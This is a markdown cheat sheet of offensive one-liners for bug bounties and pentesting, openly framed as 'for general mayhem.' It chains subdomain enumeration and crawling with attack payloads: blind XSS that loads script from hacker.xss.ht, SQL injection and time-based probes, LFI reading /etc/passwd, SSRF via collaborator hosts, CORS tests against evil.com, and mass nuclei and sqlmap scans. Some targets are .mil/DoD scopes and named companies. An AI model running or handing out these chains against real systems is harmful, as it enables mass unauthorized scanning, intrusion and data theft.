# Oneliner commands for bug bounties and pentesting or general mayhem! You didn't get these from me. 

## Find Subdomain
> projectdiscovery
```bash
subfinder -d target.com -silent | httpx -silent -o urls.txt
```
## Search Subdomain using Gospider
> https://github.com/KingOfBugbounty/KingOfBugBountyTips/
```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

## find .git/HEAD
> @ofjaaah
```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

## Check .git/HEAD
> @ofjaaah
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

## Find XSS
> cihanmehmet
### Single target
```bash
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
### Multiple target
```bash
gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
## Find XSS
> dwisiswant0
```bash
#/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht

# save to .sh, and run bash program.sh target.com
```
## Kxss to search param XSS
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```

## XSS hunting multiple
> @ofjaaah
```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

## BXSS - Bling XSS in Parameters
> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
```bash
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```

## Blind XSS In X-Forwarded-For Header
> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
```bash
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
```

## Gxss with single target
> @KathanP19
```bash
echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```

## XSS using gf with single target
> @infosecMatter
```bash
echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
```

## XSS without gf
> HacktifyS
```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
`or`
```bash
gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

## XSS qsreplace
> @KingOfBugBounty
```bash
gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

## XSS httpx
> @ofjaah
```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```
## Automating XSS using Dalfox, GF and Waybackurls
> [Automating XSS using Dalfox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75)
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```

## XSS from javascript hidden params
> @0xJin
```bash
assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```

## XSS freq
> @ofjaaah
```bash
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```

## Find xss
> @skothastad
```bash
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```

> @mamunwhh
```bash
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```

## Find XSS + knoxss
> @ofjaaah
```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
```

## Dump In-Scope Assests from Bounty Program
### BugCrowd Programs
> @dwisiswant0
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

## Recon.dev
> @ofjaaah
```bash
curl "https://recon.dev/api/search?key=YOURAPIKEY&domain=target.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

## Jaeles scan to bugbounty targets.
> @KingOfBugbounty
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
> @ofjaah
```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

## Nuclei scan to bugbounty targets.
> @hack_fish
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
```
> @ofjaah
```bash
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```

## Endpoints, by apks
> @ofjaaah
```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```

## Find Subdomains TakeOver
> hahwul
```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

## CORS Misconfiguration
> manas_hunter
```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

## SQL Injection
> @ofjaaah
```bash
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```

## Search SQLINJECTION using qsreplace search syntax error
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

## SQLi-TimeBased scanner
> @slv0d
```bash
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
```

## Recon to search SSRF Test
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```

## Using shodan & Nuclei
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column. httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.
```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

## Using Chaos to jaeles "How did I find a critical today?.
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates.
```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```
edited **if we don't have chaos api_key**
```bash
cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
```

## Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
> @sratarun
```bash
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```

### Local File Inclusion
> @dwisiswant0
```bash
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0
```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

## Directory Listing

### (Feroxbuster) common command
```bash
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```
### (Feroxbuster) Multiple values
> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
```
### (Feroxbuster) Read urls from STDIN; pipe only resulting urls out to another tool
> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
```

# search javascript file
> @ofjaaah
```bash
gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```

# Uncover
>  [projectdiscovery/uncover](https://github.com/projectdiscovery/uncover)
```bash
uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
uncover -q target -f ip | naabu
echo jira | uncover -e shodan,censys -silent
```
> @ofjaah
```bash
uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -silent -severity low,medium,high,critical
```

# Find admin login
> @0x_rood
```bash
cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
```

# 403 login Bypass
> @_bughunter
```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```

# Recon Parameters
```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```
Oneliners
###  BBRF SCOPE DoD

```bash
bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' '*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' '*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil'
```



###  Scan All domains using Knoxss

```bash
echo "dominio" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\""}' | sh 
```


###  Scan All github repo ORG

```bash
docker run --rm  mswell/masstrufflehog -o paypal

```

###  Scan log4j using BBRF and log4j-scan
(https://bit.ly/3IUivk9)
```bash
bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
```

###  SSTI in qsreplase add "{{7*7}}" (0xJin)

```bash
cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080

```

###  urldedupe bhedak

```bash
waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```

### Hakrawler Airixss XSS 

```bash
echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```


###  Airixss XSS 

```bash
echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```


###  FREQ XSS 

```bash
echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
```


###  Bhedak

```bash
cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
```

###  .bashrc shortcut OFJAAAH

```bash
reconjs(){
gau -subs $1 |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt ; cat js.txt | anti-burl | awk '{print $4}' | sort -u >> AliveJs.txt
}
cert(){
curl -s "[https://crt.sh/?q=%.$1&output=json](https://crt.sh/?q=%25.$1&output=json)" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
}
anubis(){
curl -s "[https://jldc.me/anubis/subdomains/$1](https://jldc.me/anubis/subdomains/$1)" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
}
```

###  Oneliner Haklistgen
- @hakluke

```bash
subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; done
cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt;
```

###  Running JavaScript on each page send to proxy. 


```bash
cat 200http | page-fetch --javascript '[...document.querySelectorAll("a")].map(n => n.href)' --proxy http://192.168.15.47:8080
```

###  Running cariddi to Crawler


```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```

###  Dalfox scan to bugbounty targets.


```bash
xargs -a xss-urls.txt -I@ bash -c 'python3 /dir-to-xsstrike/xsstrike.py -u @ --fuzzer'
```

### Dalfox scan to bugbounty targets.

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
```

### Using x8 to Hidden parameters discovery


```bash
assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o enumerate'
```

### Extract .js Subdomains


```bash
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
```


### goop to search .git files.


```bash
xargs -a xss -P10 -I@ sh -c 'goop @'
```

### Using chaos list to enumerate endpoint

```bash
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/master/chaos-bugbounty-list.json | jq -r '.programs[].domains[]' | xargs -I@ sh -c 'python3 paramspider.py -d @'
```

### Using Wingman to search XSS reflect / DOM XSS



```bash
xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify'

```

### Search ASN to metabigor and resolvers domain



```bash
echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'

```

### OneLiners

### Search .json gospider filter anti-burl



```bash
gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}' | tr -d "[]" | anew | anti-burl

```

### Search .json subdomain



```bash
assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 
```

### SonarDNS extract subdomains



```bash
wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json.gz ; gunzip 2021-02-26-1614298023-fdns_a.json.gz ; cat 2021-02-26-1614298023-fdns_a.json | grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar
```

### Kxss to search param XSS 



```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```


### Recon subdomains and gau to search vuls DalFox



```bash
assetfinder testphp.vulnweb.com | gau |  dalfox pipe
```


### Recon subdomains and Screenshot to URL using gowitness



```bash
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
```


###  Extract urls to source code comments



```bash
cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]' 
```

###  Axiom recon "complete"



```bash
findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u 
```

###  Domain subdomain extraction 



```bash
cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only @ | anew | httpx -silent  -threads 100 | anew httpDomain'

```


###  Search .js using 



```bash
assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$" | anew
```


###  This one was huge ... But it collects .js gau + wayback + gospider and makes an analysis of the js. tools you need below.



```bash
cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
```


###  My recon automation simple. OFJAAAH.sh



```bash
chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 >> assetfinder1 ; subfinder -d $1 -o subfinder1 -silent ; cat assetfinder1 subfinder1 chaos1 >> hosts ; cat hosts | anew clearDOMAIN ; httpx -l hosts -silent -threads 100 | anew http200 ; rm -rf chaos1 assetfinder1 subfinder1
```

###  Download all domains to bounty chaos



```bash
curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
```

###  Recon to search SSRF Test



```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```


###  ShuffleDNS to domains in file scan nuclei.



```bash
xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
```


###  Search Asn Amass



Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all tld's in that IP space (paypal.com, paypal.co.id, paypal.me)

```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```

###  SQLINJECTION Mass domain file



```bash

httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```


###  Using chaos search js




Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".

```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
```

###  Search Subdomain using Gospider




GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching plain-text data sets for lines that match a regular expression to search HTTP and HTTPS

```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  Using gospider to chaos




GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a subdomain search project, to use it needs the api, to xargs is a command on Unix and most Unix-like operating systems used to build and execute commands from standard input.


```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```

###  Using recon.dev and gospider crawler subdomains



We will use recon.dev api to extract ready subdomains infos, then parsing output json with jq, replacing with a Stream EDitor all blank spaces
If anew, we can sort and display unique domains on screen, redirecting this output list to httpx to create a new list with just alive domains.
Xargs is being used to deal with gospider with 3 parallel proccess and then using grep within regexp just taking http urls.

```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -P3 -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  PSQL - search subdomain using cert.sh



Make use of pgsql cli of crt.sh, replace all comma to new lines and grep just twitch text domains with anew to confirm unique outputs

```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
```

###  Search subdomains using github and httpx

- [Github-search]

Using python3 to search subdomains, httpx filter hosts by up status-code response (200)

```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```

###  Search SQLINJECTION using qsreplace search syntax error



```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

###  Search subdomains using jldc



```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

###  Search subdomains in assetfinder using hakrawler spider to search links in content responses



```bash
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```

###  Search subdomains in cert.sh



```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```

###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD



```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
###  Collect js files from hosts up by gospider



```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

###  Subdomain search Bufferover resolving domain to httpx



```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```

###  Using gargs to gospider search with parallel proccess
- [Gargs](https://github.com/brentp/gargs)



```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```

###  Injection xss using qsreplace to urls filter to gospider



```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

###  Extract URL's to apk



```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```

###  Chaos to Gospider



```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```

###  Checking invalid certificate

- [Real script](https://bit.ly/2DhAwMo)
- [Script King](https://bit.ly/34Z0kIH)

```bash
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```

###  Using shodan & Nuclei



Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.

```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

###  Open Redirect test using gf.



echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.

```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".



```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
###  Using Chaos to jaeles "How did I find a critical today?.



